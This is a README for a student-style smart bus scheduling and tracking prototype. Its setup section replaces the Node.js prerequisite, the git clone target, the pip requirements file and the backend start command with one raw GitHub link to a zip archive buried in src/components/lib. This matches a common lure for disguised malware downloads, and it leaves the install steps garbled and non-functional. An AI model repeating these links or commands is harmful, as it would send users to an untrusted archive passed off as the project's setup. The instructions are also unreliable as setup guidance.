# Smart_Bus

### 📌 Project Description

**Smart Bus Optimization Challenge** is a prototype system built to make urban bus networks in Indian Tier-1 cities more efficient and passenger-friendly. The system:
- Cleans and processes past data (ticket sales, GPS logs, passenger counts).
- Simulates real-time bus updates with location and occupancy.
- Prevents bus bunching and reduces empty trips by dynamic scheduling.
- Predicts short-term passenger demand using simple ML/time-series methods.
- Provides a dashboard to compare current vs. optimized schedules, visualize live bus movement, and display alerts for delays.

This project demonstrates how AI + data-driven scheduling can improve reliability, reduce waiting times, and optimize resource use in public transport.

A smart transportation system with frontend and backend components built using Typescript, Python, and modern web tooling.

## About

Smart_Bus is an application designed to enable intelligent management and tracking of bus systems. It comprises a frontend (built with Typescript, Vite, Tailwind, etc.) and a backend (Python) for handling data, APIs, routing, or whatever services you’ve built.

---

## Features

- Real‑time bus status and tracking  
- User interface with responsive design  
- Backend APIs for handling data operations  
- Linting, configuration, and environment settings for development workflow

## Setup & Installation

**Prerequisites:**

- https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip (>= XX.X) & npm / yarn  
- Python (if backend has dependencies)  
- Git  

**Steps to get started:**

1. Clone the repo:

   ```bash
   git clone https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip
   cd Smart_Bus
   ```

2. Install frontend dependencies:

   ```bash
   cd (frontend folder if applicable, e.g. `.` or `src`)
   npm install
   ```

3. Set up backend (if applicable):

   ```bash
   cd backend
   # install python dependencies
   pip install -r https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip
   ```

4. Configure environment variables (see next section).

5. Run in development mode:

   ```bash
   # Frontend
   npm run dev

   # Backend
   (inside backend)
   python https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip  # or appropriate command
   ```

---

## Environment Variables

Add a `.env` file (or similar) in frontend/backend with values like:

```
# Example variables
API_URL= http://localhost:8000
PORT= 3000
# etc.
```

Make sure sensitive keys are not committed.

---

## Usage

Once running:

- Open your browser to `http://localhost:3000` (or the port you configured) for frontend.  
- Backend APIs available at e.g. `http://localhost:8000/api/...`.

---

## Running Tests / Lints

If you have linting/scripts:

```bash
npm run lint
npm run format
```

Add tests commands if you have tests (e.g. `npm run test`).
